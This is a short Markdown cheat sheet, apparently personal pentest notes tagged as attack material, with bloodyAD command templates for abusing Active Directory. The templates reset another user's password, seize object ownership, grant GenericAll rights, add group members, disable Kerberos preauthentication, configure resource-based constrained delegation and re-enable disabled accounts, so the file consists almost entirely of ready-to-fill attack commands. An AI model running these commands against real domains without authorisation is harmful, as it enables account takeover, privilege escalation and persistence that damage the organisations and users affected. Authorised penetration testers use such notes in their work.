# bloodyad
#plateform/linux #target/remote #cat/ATTACK

## change password / set password
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set password '<target_user>' '<new_passwd|Password123!>'
```

## Get writable 
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' get writable
```

## Set owner
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set owner '<target_obj>' '<our_acc>'
```

## Add GenericAll 
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add genericAll '<target_obj>' '<our_acc>'
```

## Add group member 
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add groupMember '<group>' '<member>'
```

## Disable preauth
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add uac '<target_obj>' -f DONT_REQ_PREAUTH
```

## Add RBCD
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add rbcd '<target_obj>' '<service_acc>'
```

## Enable Account
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd' remove uac 'account' -f ACCOUNTDISABLE
```
